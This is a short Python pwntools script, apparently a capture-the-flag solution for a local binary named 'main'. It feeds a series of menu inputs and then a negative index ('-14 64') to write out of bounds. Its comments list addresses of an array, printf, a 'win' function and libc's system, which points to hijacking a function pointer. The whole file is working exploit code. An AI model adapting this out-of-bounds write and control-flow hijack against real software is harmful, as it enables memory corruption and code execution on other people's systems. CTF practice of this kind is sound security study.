from pwn import *

p = process('./main')

# 0010 1010 1010 1010 1010 0010 1000 1011 1100 0101 0001 1101
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 64")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 0")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 2")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 3")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 4")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 8")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 10")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 14")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 15")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 16")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 17")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 19")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 23")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 25")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 29")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 31")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 33")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 35")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 37")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 39")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 41")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 43")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"64 45")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"-14 64")

p.interactive()
# -128 so index -16
# arr       0x5555555574c0
# printf    0x555555557440
# win       0x5555555553ed
# system    0x7ffff7dd9d70
# printf    0x7ffff7de96f0